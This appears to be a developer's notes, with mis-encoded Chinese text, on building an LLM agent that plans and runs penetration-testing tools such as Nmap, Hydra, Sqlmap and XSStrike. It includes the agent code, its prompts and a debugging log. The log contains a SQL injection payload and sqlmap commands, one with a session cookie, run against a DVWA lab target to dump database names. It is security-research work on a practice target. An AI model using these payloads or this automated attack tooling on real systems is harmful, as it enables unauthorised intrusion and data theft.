- **ä»»åŠ¡æˆåŠŸ**ï¼šå¦‚æžœçŠ¶æ€ç ä¸º0ï¼Œåˆ™è¾“å‡ºâ€œä»»åŠ¡æˆåŠŸå®Œæˆâ€ã€‚
- **ä»»åŠ¡å¤±è´¥**ï¼šå¦‚æžœä»»åŠ¡å¤±è´¥ï¼Œè¯·æ ¹æ®çŠ¶æ€ç å’Œä»»åŠ¡ä¿¡æ¯è¯´æ˜Žå¤±è´¥çš„å…·ä½“åŽŸå› ï¼Œå¹¶æä¾›å¯èƒ½çš„è§£å†³æ–¹æ¡ˆã€‚

**ç¤ºä¾‹ï¼š**
è¾“å…¥ï¼š

çŠ¶æ€ç ï¼š-1

ä»»åŠ¡ä¿¡æ¯ï¼šå‡½æ•°åˆ›å»ºæ—¶å‚æ•°æ ¼å¼ä¸ç¬¦åˆè¦æ±‚ã€‚

è¾“å‡ºï¼š

ä»»åŠ¡å¤±è´¥ã€‚åŽŸå› ï¼šåˆ›å»ºå‡½æ•°æ—¶å‚æ•°é”™è¯¯ã€‚å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼šè¯·æ£€æŸ¥è¾“å…¥å‚æ•°çš„æ ¼å¼ï¼Œç¡®ä¿æä¾›äº†æ‰€æœ‰å¿…è¦çš„å‚æ•°ã€‚

ä»¥ä¸‹æ˜¯å®žé™…åº”ç”¨åœºæ™¯ï¼š
è¾“å…¥ï¼š

çŠ¶æ€ç ï¼š{code}
ä»»åŠ¡ä¿¡æ¯ï¼š{msg}
è¾“å‡ºï¼š
```
#### executor
å¾ˆæ˜Žæ˜¾ï¼Œæ‰§è¡Œagent
> å¦‚æžœè®¡åˆ’ä¸­æŸæ­¥éª¤å¯ä»¥åˆ©ç”¨å·¥å…·è§£å†³ï¼Œé‚£ä¹ˆè¯¥agentæ‰§è¡Œ
> å¯¹pluginï¼Œretrievalï¼Œplannerçš„é›†æˆè°ƒç”¨


```python
from agent.base import Agent
from model.base import ChatModel
from config import config_manager
from retrieval import Retrieval, BgeReranker
from planner import NmapPlanner, CapChecker, ToolsPlanner
from plugin import plugin


class ExecutorAgent(Agent):

    def __init__(self, chat_model: ChatModel) -> None:
        self.chat_model = chat_model
        self.retrieval_model = self._read_retrieval_model()
        self.tools = ["Nmap", "CMSeek", "Dirsearch", "Hydra", "Sqlmap", "Tplmap", "XSStrike"]
        self.nmap_planner = NmapPlanner(chat_model=self.chat_model, skill_name="Nmap", reranker=self.retrieval_model)
        self.planner = ToolsPlanner(chat_model=self.chat_model)
        self.capability_checker = CapChecker(chat_model=self.chat_model)

    def _read_retrieval_model(self) -> Retrieval:
        reranker_name_or_path = config_manager.config["Retrieval"]["reranker_path"]
        retrieval_model = BgeReranker(embedding_name_or_path=reranker_name_or_path, use_fp16=True)
        return retrieval_model

    def _exec_nmap_tool(self, query: str) -> str:
        self._print_tool_message(f"ðŸŽ Execute Nmap tool")
        _, plan = self.nmap_planner.create_plan(query)
        result = self.nmap_planner.execute_plan(plan)
        return result

    
    def _exec_tools(self, query: str, skill_name: str) -> str:
        self.planner.skill_name = skill_name
        self.planner.skill = plugin.read_skill(skill_name)
        self._print_tool_message(f"ðŸŽ Execute {skill_name} tool")
        _, plan = self.planner.create_plan(query)
        result = self.planner.execute_plan(plan)
        return result

    def _exec_tool(self, query: str, capability_checker_result: int) -> str:
        result = ""
        if capability_checker_result == 1:
            result = self._exec_nmap_tool(query)
        else:
            result = self._exec_tools(query, self.tools[capability_checker_result - 1])
        # if result is "", raise error
        return result

    def _exec_capability_check(self, query: str) -> str:
        _, plan = self.capability_checker.create_plan(query)
        result = self.capability_checker.execute_plan(plan)
        return result

    def _print_tool_message(self, msg: str):
        print(f"\033[32m{msg}\033[0m")

    def process(self, query: str) -> str:
        capability_checker_result = self._exec_capability_check(query)
        if capability_checker_result == 0:
            return "According to the user's request, no suitable tool was found to complete the task"

        exec_result = self._exec_tool(query, capability_checker_result)

        return exec_result

```


#### refiner
æ˜¾è€Œæ˜“è§ï¼Œæ ¹æ®ä»»åŠ¡æ‰§è¡Œæµç»“æžœï¼Œè¿›ä¸€æ­¥åˆ¶å®šæ›´å¥½çš„è®¡åˆ’
```python
class RefinerAgent(Agent):

    def __init__(self, chat_model: ChatModel) -> None:
        self.prompt_template = PROMPT
        self.chat_model = chat_model

    def process(self, query: List[str]) -> str:
        plan, result = query
        if "XSStrike" in result:
            prompt = PROMPT_FOR_XSSTRIKE.format(plan=plan, result=result)
        else:
            prompt = PROMPT.format(plan=plan, result=result)
        response =  self.chat_model.chat(prompt)
        # Remove redundant information åŽ»å†—ä½™
        if "[new plan]" in response:
            response =  response.split("[new plan]")[1]
        if "[plan end]" in response:
            response =  response.split("[plan end]")[0]
        if "[new plan end]" in response:
            response =  response.split("[new plan end]")[0]
        logger.info(f"refiner output - {response.strip()}")
        return response.strip()
```

æœ‰ä¸¤ä¸ªpromptï¼Œå¯¹äºŽxsstrikeç‰¹æ„åˆ†äº†ä¸€ä¸ªpromptå‡ºæ¥
ä¸‹é¢æ˜¯é€šç”¨prompt

**ä½ çš„ä»»åŠ¡æ˜¯æ ¹æ®å½“å‰æ­¥éª¤å’Œ[result]çš„å†…å®¹ï¼Œè¯„ä¼°[å½“å‰æ­¥éª¤]æ˜¯å¦å®Œæˆï¼Œ**
**å¦‚æžœæ­¥éª¤å®Œæˆï¼Œæˆ–è€…[result]è¡¨ç¤ºæ— æ³•å®Œæˆï¼Œåˆ™éœ€è¦ç”Ÿæˆæˆ–æ”¹è¿›ä¸‹ä¸€æ­¥ã€‚**

```text
ä½ æ˜¯ä¸€ä¸ªWebå®‰å…¨æ‰«æåŠ©æ‰‹ï¼Œç”¨æˆ·ä¼šä¸ºä½ æä¾›ä¸€ä¸ªè®¡åˆ’[plan]å’Œå½“å‰æ­¥éª¤çš„ç»“æžœ[result]ï¼Œ[result]çš„å†…å®¹å¯ä»¥æ˜¯å½“å‰æ­¥éª¤çš„æ‰§è¡Œç»“æžœï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·æä¾›çš„é™„åŠ ä¿¡æ¯ã€‚

è®¡åˆ’ä¸­å¯èƒ½åŒ…å«ç²—ç•¥æˆ–è¯¦ç»†çš„æ­¥éª¤ï¼Œå®Œæˆçš„æ­¥éª¤ä¼šè¢«æ ‡è®°ã€‚ä½ çš„ä»»åŠ¡æ˜¯æ ¹æ®å½“å‰æ­¥éª¤å’Œ[result]çš„å†…å®¹ï¼Œè¯„ä¼°[å½“å‰æ­¥éª¤]æ˜¯å¦å®Œæˆï¼Œå¦‚æžœæ­¥éª¤å®Œæˆï¼Œæˆ–è€…[result]è¡¨ç¤ºæ— æ³•å®Œæˆï¼Œåˆ™éœ€è¦ç”Ÿæˆæˆ–æ”¹è¿›ä¸‹ä¸€æ­¥ã€‚

å¦‚æžœå½“å‰æ­¥éª¤ä¸å®Œæˆï¼Œåˆ™éœ€è¦æ ¹æ®[result]çš„å†…å®¹å¯¹å½“å‰æ­¥éª¤è¿›è¡Œç»†åŒ–å’Œä¿®æ”¹ï¼Œä½¿å…¶å°½å¯èƒ½å®Œæ•´ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸º[å½“å‰æ­¥éª¤]ã€‚

å¦‚æžœéœ€è¦ä½¿ç”¨NMAPã€CMSeekã€Dirsearchã€Hydraã€Sqlmapã€tplmapæˆ–XSStrikeç­‰å·¥å…·ï¼Œè¯·åœ¨æ­¥éª¤ä¸­æŒ‡å®šå·¥å…·åç§°ã€ç›®æ ‡IPå’Œç«¯å£ã€‚

å¦‚æžœæŸä¸ªæ­¥éª¤å®Œæˆï¼Œåˆ™å°†å…¶æ ‡è®°ä¸º[å®Œæˆ]ã€‚ç¡®ä¿ä¸‹ä¸€æ­¥è¦å®Œæˆçš„æ“ä½œæ ‡è®°ä¸º[å½“å‰æ­¥éª¤]ã€‚æ¯ä¸ª[å½“å‰æ­¥éª¤]å¿…é¡»åŒ…å«ç›®æ ‡åœ°å€ï¼Œæ¯ä¸ªæ­¥éª¤å¿…é¡»ä»¥ä»»åŠ¡å·å¼€å¤´ï¼Œæ¯ä¸ªæ­¥éª¤åº”ä»¥ä¸€è¡Œæè¿°ï¼Œä¸è¦è¾“å‡ºå¤šè¡Œã€‚

ç¤ºä¾‹å¦‚ä¸‹ï¼š

[è®¡åˆ’]

1.å‡†å¤‡é˜¶æ®µï¼šé¦–å…ˆï¼Œç¡®ä¿æ‚¨å·²èŽ·å–ç›®æ ‡WebæœåŠ¡çš„æ‰€æœ‰ç›¸å…³URLã€‚å¯¹äºŽéœ€è¦èº«ä»½éªŒè¯çš„éƒ¨åˆ†ï¼Œå‡†å¤‡ç›¸åº”çš„å‡­æ®ã€‚[å½“å‰æ­¥éª¤]

2.æ£€æµ‹é˜¶æ®µï¼šä½¿ç”¨W3AFè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ã€‚é…ç½®W3AFä½¿ç”¨å…¶SQLæ³¨å…¥æ’ä»¶ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„ç›®æ ‡URLå’Œå‚æ•°ã€‚å¯åŠ¨æ‰«æå¹¶ç­‰å¾…æ‰«æå®Œæˆã€‚

[è®¡åˆ’ç»“æŸ]

[ç»“æžœ]
æˆ‘çš„æœåŠ¡æ‰˜ç®¡åœ¨xxx.x.x.x:xxxxï¼Œç³»ç»Ÿå¸æˆ·ä¸ºxxxï¼Œå¯†ç ä¸ºyyyã€‚

[ç»“æžœç»“æŸ]

[æ–°è®¡åˆ’]

1.å‡†å¤‡é˜¶æ®µï¼šé¦–å…ˆï¼Œç¡®ä¿æ‚¨å·²èŽ·å–ç›®æ ‡WebæœåŠ¡çš„æ‰€æœ‰ç›¸å…³URLã€‚å¯¹äºŽéœ€è¦èº«ä»½éªŒè¯çš„éƒ¨åˆ†ï¼Œå‡†å¤‡ç›¸åº”çš„å‡­æ®ã€‚ [å®Œæˆ]
2. æ£€æµ‹é˜¶æ®µï¼šä½¿ç”¨W3AFè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ï¼Œé…ç½®W3AFä½¿ç”¨å…¶SQLæ³¨å…¥æ’ä»¶ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„ç›®æ ‡URLå’Œå‚æ•°ï¼Œå¯åŠ¨æ‰«æå¹¶ç­‰å¾…æ‰«æå®Œæˆã€‚
2.1 ......................[å½“å‰æ­¥éª¤]
2.2 ......................
2.3 ......................
[æ–°è®¡åˆ’ç»“æŸ]

[è®¡åˆ’]
{è®¡åˆ’}
[è®¡åˆ’ç»“æŸ]

[ç»“æžœ]
{ç»“æžœ}
[ç»“æžœç»“æŸ]

[æ–°è®¡åˆ’]
```
ç„¶åŽå¤§å·®ä¸å·®ï¼Œä¸‹é¢æ˜¯xsstrikeçš„prompt

```text
ä½ æ˜¯ä¸€ä¸ªWebå®‰å…¨æ‰«æåŠ©æ‰‹ï¼Œç”¨æˆ·ä¼šä¸ºä½ æä¾›ä¸€ä¸ªè®¡åˆ’[plan]å’Œå½“å‰æ­¥éª¤çš„ç»“æžœ[result]ï¼Œ[result]çš„å†…å®¹å¯ä»¥æ˜¯å½“å‰æ­¥éª¤çš„æ‰§è¡Œç»“æžœï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·æä¾›çš„é™„åŠ ä¿¡æ¯ã€‚

è®¡åˆ’ä¸­å¯èƒ½åŒ…å«ç²—ç•¥æˆ–è¯¦ç»†çš„æ­¥éª¤ï¼Œå®Œæˆçš„æ­¥éª¤ä¼šè¢«æ ‡è®°ã€‚ä½ çš„ä»»åŠ¡æ˜¯æ ¹æ®å½“å‰æ­¥éª¤å’Œ[result]çš„å†…å®¹ï¼Œè¯„ä¼°[å½“å‰æ­¥éª¤]æ˜¯å¦å®Œæˆï¼Œå¦‚æžœæ­¥éª¤å®Œæˆï¼Œæˆ–è€…[result]è¡¨ç¤ºæ— æ³•å®Œæˆï¼Œåˆ™éœ€è¦ç”Ÿæˆæˆ–æ”¹è¿›ä¸‹ä¸€æ­¥ã€‚

å¦‚æžœå½“å‰æ­¥éª¤ä¸å®Œæˆï¼Œåˆ™éœ€è¦æ ¹æ®[result]çš„å†…å®¹å¯¹å½“å‰æ­¥éª¤è¿›è¡Œç»†åŒ–å’Œä¿®æ”¹ï¼Œä½¿å…¶å°½å¯èƒ½å®Œæ•´ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸º[å½“å‰æ­¥éª¤]ã€‚

å¦‚æžœéœ€è¦ä½¿ç”¨NMAPã€CMSeekã€Dirsearchã€Hydraã€Sqlmapã€tplmapæˆ–XSStrikeç­‰å·¥å…·ï¼Œè¯·åœ¨æ­¥éª¤ä¸­æŒ‡å®šå·¥å…·åç§°ã€ç›®æ ‡IPå’Œç«¯å£ã€‚

å¦‚æžœæŸä¸ªæ­¥éª¤å®Œæˆï¼Œåˆ™å°†å…¶æ ‡è®°ä¸º[å®Œæˆ]ã€‚ç¡®ä¿ä¸‹ä¸€æ­¥è¦å®Œæˆçš„æ“ä½œæ ‡è®°ä¸º[å½“å‰æ­¥éª¤]ã€‚æ¯ä¸ª[å½“å‰æ­¥éª¤]å¿…é¡»åŒ…å«ç›®æ ‡åœ°å€ï¼Œæ¯ä¸ªæ­¥éª¤å¿…é¡»ä»¥ä»»åŠ¡å·å¼€å¤´ï¼Œæ¯ä¸ªæ­¥éª¤åº”ä»¥ä¸€è¡Œæè¿°ï¼Œä¸è¦è¾“å‡ºå¤šè¡Œã€‚

ç¤ºä¾‹å¦‚ä¸‹ï¼š

[è®¡åˆ’]

1.å‡†å¤‡é˜¶æ®µï¼šé¦–å…ˆï¼Œç¡®ä¿æ‚¨å·²èŽ·å–ç›®æ ‡WebæœåŠ¡çš„æ‰€æœ‰ç›¸å…³URLã€‚å¯¹äºŽéœ€è¦èº«ä»½éªŒè¯çš„éƒ¨åˆ†ï¼Œå‡†å¤‡ç›¸åº”çš„å‡­æ®ã€‚[å½“å‰æ­¥éª¤]

2.æ£€æµ‹é˜¶æ®µï¼šä½¿ç”¨W3AFè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ã€‚é…ç½®W3AFä½¿ç”¨å…¶SQLæ³¨å…¥æ’ä»¶ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„ç›®æ ‡URLå’Œå‚æ•°ã€‚å¯åŠ¨æ‰«æå¹¶ç­‰å¾…æ‰«æå®Œæˆã€‚

[è®¡åˆ’ç»“æŸ]

[ç»“æžœ]
æˆ‘çš„æœåŠ¡æ‰˜ç®¡åœ¨xxx.x.x.x:xxxxï¼Œç³»ç»Ÿå¸æˆ·ä¸ºxxxï¼Œå¯†ç ä¸ºyyyã€‚

[ç»“æžœç»“æŸ]

[æ–°è®¡åˆ’]

1.å‡†å¤‡é˜¶æ®µï¼šé¦–å…ˆï¼Œç¡®ä¿æ‚¨å·²èŽ·å–ç›®æ ‡WebæœåŠ¡çš„æ‰€æœ‰ç›¸å…³URLã€‚å¯¹äºŽéœ€è¦èº«ä»½éªŒè¯çš„éƒ¨åˆ†ï¼Œå‡†å¤‡ç›¸åº”çš„å‡­æ®ã€‚ [å®Œæˆ]
2. æ£€æµ‹é˜¶æ®µï¼šä½¿ç”¨W3AFè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ï¼Œé…ç½®W3AFä½¿ç”¨å…¶SQLæ³¨å…¥æ’ä»¶ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„ç›®æ ‡URLå’Œå‚æ•°ï¼Œå¯åŠ¨æ‰«æå¹¶ç­‰å¾…æ‰«æå®Œæˆã€‚
2.1 ......................[å½“å‰æ­¥éª¤]
2.2 ......................
2.3 ......................
[æ–°è®¡åˆ’ç»“æŸ]

ä¸‹é¢å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼š

[è®¡åˆ’]
1. å‡†å¤‡é˜¶æ®µï¼šä½¿ç”¨NMAPæ‰«æ10.12.189.7:11452ä¸Šçš„ç«¯å£å’ŒæœåŠ¡ï¼Œç¡®ä¿ç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œå¹¶è¯†åˆ«å…¶æœåŠ¡ç±»åž‹ã€‚ [å®Œæˆ]
2. æ£€æµ‹é˜¶æ®µï¼šä½¿ç”¨XSStrikeå¯¹10.12.189.7:11452è¿›è¡ŒXSSæ¼æ´žæ£€æµ‹ã€‚ [å½“å‰æ­¥éª¤]
[è®¡åˆ’ç»“æŸ]

[ç»“æžœ]
XSStrike v3.1.5

[!!] æ— æ³•è¿žæŽ¥åˆ°ç›®æ ‡ã€‚
[!!] æ— æ³•è¿žæŽ¥åˆ°ç›®æ ‡ã€‚
[~] æ£€æŸ¥ DOM æ¼æ´ž
[-] æ²¡æœ‰è¦æµ‹è¯•çš„å‚æ•°ã€‚
[ç»“æžœç»“æŸ]

[æ–°è®¡åˆ’]
1. å‡†å¤‡é˜¶æ®µï¼šé¦–å…ˆï¼Œç¡®ä¿æ‚¨å·²èŽ·å–ç›®æ ‡ Web æœåŠ¡çš„æ‰€æœ‰ç›¸å…³ URLã€‚å¯¹äºŽéœ€è¦èº«ä»½éªŒè¯çš„éƒ¨åˆ†ï¼Œè¯·å‡†å¤‡ç›¸åº”çš„å‡­æ®ã€‚[å®Œæˆ]
2. æ£€æµ‹é˜¶æ®µï¼šæ— æ³•è¿žæŽ¥åˆ°ç›®æ ‡ã€‚è¯·æ›¿æ¢ç›®æ ‡æˆ–è¡¥å……æµ‹è¯•å‚æ•°ã€‚[å½“å‰æ­¥éª¤]
[æ–°è®¡åˆ’ç»“æŸ]

ä»¥ä¸Šæ˜¯æ‚¨çš„å·¥ä½œç¤ºä¾‹ã€‚ä»¥ä¸‹æ˜¯å®žé™…åº”ç”¨åœºæ™¯ï¼š

[è®¡åˆ’]
{è®¡åˆ’}
[è®¡åˆ’ç»“æŸ]

[ç»“æžœ]
{ç»“æžœ}
[ç»“æžœç»“æŸ]

[æ–°è®¡åˆ’]
```

### main
è‡³æ­¤ï¼Œå„éƒ¨åˆ†ç»„ä»¶åŠŸèƒ½å·²ç»åŸºæœ¬æ¸…æ™°ï¼Œä¸‹é¢æ¥çœ‹æ˜¯å¦‚ä½•ç»¼åˆä½¿ç”¨agentçš„
```python

class PentestAssistant:

    def __init__(self, chat_model: ChatModel):
        self.chat_model = chat_model
        self.max_repeat_time = 3

        self._init_bot()

    def _init_bot(self):

        # init agent
        # åšè®¡åˆ’ï¼Œè¿›ä¸€æ­¥å®Œå–„è®¡åˆ’ï¼ŒéªŒè¯è®¡åˆ’å¯æ‰§è¡Œè¡Œï¼Œæ‰§è¡Œè®¡åˆ’ï¼ˆå¯è‡ªåŠ¨è°ƒç”¨å·¥å…·ï¼‰ï¼Œåˆ†æžç»“æžœ
        self.planner_agent = PlannerAgent(chat_model=self.chat_model)
        self.refiner_agent = RefinerAgent(chat_model=self.chat_model)
        self.param_checker_agent = ParamCheckerAgent(chat_model=self.chat_model)
        self.plan_checker_agent = PlanCheckerAgent(chat_model=self.chat_model)
        self.executor_agent = ExecutorAgent(chat_model=self.chat_model)
        self.analyst_agent = AnalystAgent(chat_model=self.chat_model)

        # init status
        self.user_query = ""
        
        self.last_result = ""#æ ¹æ®ä¸Šä¸€æ¬¡ç»“æžœè¿›ä¸€æ­¥å®Œå–„è®¡åˆ’ï¼Œè‹¥ç»“æžœä¸ºâ€œâ€ï¼Œè¡¨æ˜Žåˆšå¼€å§‹
        self.plan = ""
        self.current_subplan = ""

        self.step_count = 0
        self.previous_step = 0

    def _reset_status(self):
        self.plan = ""
        self.current_subplan = ""
        self.last_result = ""
        self.user_query = ""
        self.step_count = 0
        
        self.previous_step = 0

    def process(self, query: str) -> None:
        while True:
            self.user_query = query
            # close current task
            if self.last_result == "quit":
                self._reset_status()
                self._print_bot_message("ðŸž The robot status has been initialized. Please enter the task request. To exit the robot, please enter 'quit':")
                logger.info(f"ðŸž The robot status has been initialized. Please enter the task request. To exit the robot, please enter 'quit':")
                break

            # just open new task and generate plan list
            if len(self.last_result) == 0:
                # åˆšå¼€å§‹ è®¡åˆ’agentåˆæ­¥è¿›è¡Œè®¡åˆ’
                self.plan = self.planner_agent.process(self.user_query)
                self._print_bot_message(f"ðŸ“ƒ Total Task List:\n{self.plan}")
                logger.info(f"ðŸ“ƒ Total Task List:\n{self.plan}")
            else:
                # å¦åˆ™ refineræ”¹è¿›è®¡åˆ’
                # update plan list according last subplan result
                self.plan = self.refiner_agent.process([self.plan, self.last_result])
                self._print_bot_message(f"ðŸ“ƒ Total Task List:\n{self.plan}")
                logger.info(f"ðŸ“ƒ Total Task List:\n{self.plan}")

            # judge task cycle number
            self.current_subplan = self._get_current_subplan(self.plan)
            current_step = self._extract_step(self.current_subplan)
            if current_step is None:
                self._print_bot_message(f"ðŸž Unable to resolve task label:{self.current_subplan} \n casue current_step is none")
                logger.info(f"ðŸž Unable to resolve task label:{self.current_subplan}\n casue current_step is none")
                break
            if current_step == self.previous_step:
                self.step_count += 1
            else:
                self.step_count = 1  # When encountering a different label, reset the count
                self.previous_step = current_step  # Update the last label
            if self.step_count >= self.max_repeat_time:
                self.last_result = "This step has failed and cannot be completed. Please generate a new task or skip to the next step."
                continue

            self._print_bot_message(f"âœ¨ Current Tasks:\n{self.current_subplan}")
            logger.info(f"âœ¨ Current Tasks:\n{self.current_subplan}")


            # éªŒè¯è®¡åˆ’å¯è¡Œæ€§
            plan_pattern = self.plan_checker_agent.process(self.current_subplan)
            if plan_pattern == "auto":
                self.last_result = self.executor_agent.process(self.current_subplan)
                self._print_bot_message(f"ðŸ”§ Tool execution results:\n{self.last_result}")
                logger.info(f"ðŸ”§ Tool execution results:\n{self.last_result}")
            elif plan_pattern == "anal":
                self.last_result = self.analyst_agent.process([self.current_subplan, self.last_result])
                self._print_bot_message(f"ðŸ”§ Task analysis results:\n{self.last_result}")
                logger.info(f"ðŸ”§ Task analysis results:\n{self.last_result}")
            else:
                self._print_bot_message(f"ðŸŒˆ Please enter the result of the current step (enter 'quit' to exit):")
                logger.info(f"ðŸŒˆ Please enter the result of the current step (enter 'quit' to exit):")
                self.last_result = input()

        return

    def _extract_step(self, output_string):
        # Use regular expressions to extract the sign (assuming the sign is a number followed by a period, like "2.")
        match = re.match(r"\s*(\d+(\.\d+)?)[\.\s]", output_string)
        if match:
            return match.group(1)  # Returns the matching label part
        return None

    def _get_current_subplan(self, plan: str):
        """ Get the current subtask """
        insts = plan.split('\n')
        instNow = ''
        for self.current_subplan in insts:
            if '[current step]' in self.current_subplan:
                instNow = self.current_subplan
                break
        instNow.replace("current step", "")
        return instNow

    def _remove_ansi_escape_sequences(self, text):
        ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
        return ansi_escape.sub('', text)

    def _extract_first_level_title(task_label: str) -> int:
        # Split the task number with "." and take the first part, converting it to int type
        first_level_title = int(task_label.split('.')[0])
        return first_level_title

    def _extract_plan(self, output):
        if "[plan]" in output and "[plan end]" in output:
            # When [plan] and [plan end] exist, extract the middle part
            parts = output.split("[plan]")[1].split("[plan end]")[0].strip()
            return parts
        elif "[plan end]" in output:
            # When there is only [plan end], extract from the beginning to [plan end]
            parts = output.split("[plan end]")[0].strip()
            return parts
        else:
            # If there is no [plan] or [plan end], return the original content directly
            return output.strip()

    def _print_bot_message(self, msg: str):
        print(f"\033[31m{msg}\033[0m")


if __name__ == "__main__":
    chat_model = QwenChatModel()
    # chat_model = GPTChatModel()
    pa = PentestAssistant(chat_model=chat_model)
    query = input("Please enter the task request. To exit the robot, please enter 'quit':\n")
    while True:
        if query == "quit":
            break
        
        pa.process(query)
        query = input()

```



## é‡åˆ°bug

ä»¥ä¸‹bugéƒ½æ˜¯ç”±äºŽ copyçš„æ˜¯mainåˆ†æ”¯ï¼Œ æˆ–è€…è¯´æ˜¯å› ä¸ºæ²¡å¼€å‘å®Œï¼Ÿå¯¼è‡´çš„


1.é¦–å…ˆæ˜¯éªŒè¯è®¡åˆ’æ‰§è¡Œæ€§agentçš„è°ƒç”¨é—®é¢˜ï¼Œ
![alt text](assets/pentestAssistant/image-5.png)

![alt text](assets/pentestAssistant/image-6.png)


2.ç„¶åŽæ˜¯capcheckeræ²¡æœ‰åšè¾“å‡ºç»“æžœå¤„ç†çš„é—®é¢˜
![alt text](assets/pentestAssistant/image-8.png)

![alt text](assets/pentestAssistant/image-7.png)


3.å†æ¬¡è§‚å¯Ÿåˆ°dsè¾“å‡ºçš„æŠ½è±¡æ€§ï¼Œæ€»æ˜¯ä¸åŠ æ ‡ç­¾
![alt text](assets/pentestAssistant/image-9.png)
å¹²è„†æ›´æ¢æå–æ–¹å¼ï¼Œç›´æŽ¥å–æœ€åŽä¸€è¡Œ


4.å†æ¬¡å‡ºé”™
é”™åœ¨å·¥å…·è°ƒç”¨é—®é¢˜
![alt text](assets/pentestAssistant/image-10.png)
æ‰“å°å‡ºresponseçœ‹çœ‹ï¼Œ
å¦‚ä¸‹å›¾
![alt text](assets/pentestAssistant/image-11.png)


é€šè¿‡ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çŸ¥é“
1. dsåŽ‹æ ¹å°±æ²¡æœ‰è¿›è¡Œå·¥å…·è°ƒç”¨
2. æ€»æ˜¯æœ‰ä¸€ä¸ª\<\/think\>æ ‡ç­¾æ ‡å¿—æ€è€ƒç»“æŸï¼Œç„¶åŽæ‰ç»™å‡ºç­”æ¡ˆ


![alt text](assets/pentestAssistant/image-12.png)
dsçš„function callingç›®å‰å¾ˆæŠ½è±¡ã€‚ã€‚
çŽ°åœ¨é€‰æ‹©å¯¹è¯å½¢å¼ã€‚
> å¯¹è¯å½¢å¼å¤ªéš¾æžäº†
>



ä¹‹åŽè€ƒè™‘qwenç­‰ï¼Œqwqä¹Ÿæ²¡æœ‰function callingã€‚ã€‚
å¦‚ä¸‹å›¾ä¸º qwen-plusçš„fucntion callingè°ƒç”¨æˆåŠŸ,
![alt text](assets/pentestAssistant/image-13.png)


## å°è¯•æ‰«ædvwa
å°è¯•çœ‹èƒ½å¦attack ä¸€ä¸ª
![alt text](assets/pentestAssistant/image-14.png)
å¯è§è°ƒç”¨å¾ˆå¿«ï¼ŒçŽ°åœ¨éœ€è¦ä¸€ä¸ªé¶åœºæµ‹è¯•

1. é¦–å…ˆæ‰‹åŠ¨æµ‹è¯•
![alt text](assets/pentestAssistant/image-15.png)
1' union select user,avatar from users #
![alt text](assets/pentestAssistant/image-16.png)
å¯è§æˆåŠŸèŽ·å– users è¡¨ä¸­ user åŠ avatar ä¿¡æ¯ã€‚

2. ç„¶åŽä½¿ç”¨sqlmapæµ‹è¯•
 sqlmap -u "http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=fcdgi8ogeuku3ggitk55t7uio1; security=low" --batch --dbs 
![alt text](assets/pentestAssistant/image-17.png)
æˆåŠŸèŽ·å–æ‰€æœ‰æ•°æ®åº“åç§°

çŽ°åœ¨é—®é¢˜æ˜¯ï¼Œè¿™çŽ©æ„çœŸçš„èƒ½è‡ªåŠ¨èŽ·å–cookieå—ï¼Ÿ
sqlmap -u "http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit#"  --batch --dbs
å“¦å“¦ï¼ŒåŽŸæ¥ä¸éœ€è¦ä¹Ÿèƒ½æˆ

3. æœ€åŽä½¿ç”¨æ¨¡åž‹æµ‹è¯•
   
i have a dvwa target. please use sql injection to get all database name.
 the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit#

æ¨¡åž‹æ²¡ç†è§£url
![alt text](assets/pentestAssistant/image-18.png)

the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit#
there is sql injectio. please use sql injection to get all database name.
 ![alt text](assets/pentestAssistant/image-19.png)
 å¯èƒ½æ˜¯promptä¸å¤ªå¥½ã€‚ã€‚

sqlmap the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# just use sql injection with sqlmap to get all database name.
 
qwen-plusæ¨¡åž‹å®žåœ¨æ— æ³•è¾¨è®¤å‡ºå‡†ç¡®urlï¼Œæ¢ä¸ªæ¨¡åž‹è¯•è¯•
æ¢æˆqwq-plusè¿›è¡Œå°è¯•
![alt text](assets/pentestAssistant/image-20.png)
qwq-plusä¸æ”¯æŒfunction calling
å†æ¢æˆqwen-maxè¿›è¡Œå°è¯•
![alt text](assets/pentestAssistant/image-21.png)

å‚æ•°ä¼ é€’æ˜¯æœ‰é—®é¢˜çš„ï¼Œä¹‹å‰ä¹Ÿæ˜¯
![alt text](assets/pentestAssistant/image-22.png)
```python
import shlex

# command = "sqlmap -u 'http://10.24.4.144:84'"
args = shlex.split(cmd)  # è‡ªåŠ¨å¤„ç†å¼•å·å’Œç©ºæ ¼
process = subprocess.Popen(
    args,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

# å®žæ—¶è¯»å–è¾“å‡º
lines = ""
for line in process.stdout:
    print(line, end="")
    lines += line
# ç­‰å¾…å‘½ä»¤å®Œæˆ
process.wait()
```
æˆåŠŸè‡ªåŠ¨åŒ–æ‰«å‡ºbug
![alt text](assets/pentestAssistant/image-23.png)

ä½†æ˜¯ï¼Œåˆå‘çŽ°ä¸€ä¸ªé—®é¢˜ï¼ŒæˆåŠŸå®Œæˆä»»åŠ¡åŽå¹¶æœªè‡ªåŠ¨åœæ­¢ã€‚
å¥½å§ï¼Œæ˜¯æ²¡æœ‰å®Œæˆä»»åŠ¡ã€‚ã€‚

you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# just use sql injection with sqlmap to get all the table name of database.
æ­»æ´»ä¸è¡Œ

